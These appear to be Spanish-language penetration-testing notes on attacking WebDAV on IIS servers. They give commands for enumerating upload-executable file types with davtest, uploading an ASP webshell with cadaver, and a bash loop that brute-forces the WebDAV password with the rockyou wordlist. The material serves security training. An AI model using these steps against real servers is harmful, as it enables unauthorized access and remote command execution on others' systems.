# Explotación de WebDAV en IIS

Tags: #IIS #WebDav #Servidor #Windows 

* IIS = Internet Information Services y  es un servidor web para el sistema operativo Windows.
	* Soporta extensiones de archivos ejecutables:
		* .asp
		* .aspx
		* .config
		* .php

```bash 
❯ browsh --startup-url http://IP/Default.aspx/    # Enumeracion del buscador de un IIS en forma de GUI
```

Necesitamos credenciales validas para poder entrar al WebDav en la web
```bash 
❯ http://IP/webdav/
```

## Webshell en un IIS

```bash 
/usr/share/webshells/                # Ruta de la Webshell, estas son aplicaciones que se ejecutan en la web de forma interactiva y asi poder ejecutar comandos 

	# asp, aspx, cfm, jsp, laudanum, perl, php, seclists
```

## WebDAV en un IIS

```bash 
* davtest           # Usada para escanear, autenticar y explotar un WebDAV
* cadaver           # Soporta la subida y bajada de archivos, visualizacion, editar, mover/copiar, borrar, manipular y bloqueo.
```

Esta tool crea un directorio en el servidor y va subiendo archivos con diferentes extensiones además de ver cuales se pueden ejecutar. 
```bash 
❯ davtest -auth <user>:<passwd> -url http://IP/webdav    # Necesitamos credenciales validas, y nos checara que tipo de archivos puedes subir y ejecutar en el servidor 
```

```bash 
❯ cadaver http://IP/webdav           # Puedes acceder al contenido del servidor WebDAB, te preguntara las credenciales, esta tool te desplegara una consola
	❯ put /usr/share/webshells/asp/webshell.asp      # Asi subimos la webshell al servidor Webdav
```

```bash 
❯ davtest -url http://127.0.0.1 -auth admin:admin     # Debemos de tener el usuario y passwd validos para poder usar la tool

	# 1er admin = Usuario 
	# 2do admin = passwd

❯ cat /usr/share/wordlists/rockyou.txt | while read password; do response=$(davtest -url http://127.0.0.1 -auth admin:$password 2>&1 | grep -i succed); if [ $response ]; then echo "[+] La passwd correcta es: $password"; break; fi; done

# Ataque de Fuerza Bruta para encontrar la passwd con el comando davtest

❯ cadaver http://127.0.0.1     # Sirve para subir archivos, descargar contenido, etc... Debemos de tener el usaurio y passwd validos para la autenticacion 
	❯ mkdri test              # Podriamos crearnos dir en los cuales podemos colocar un recurso 
	❯ cd test 
	❯ put webdav.txt          # Podemos subir un archivo 
```

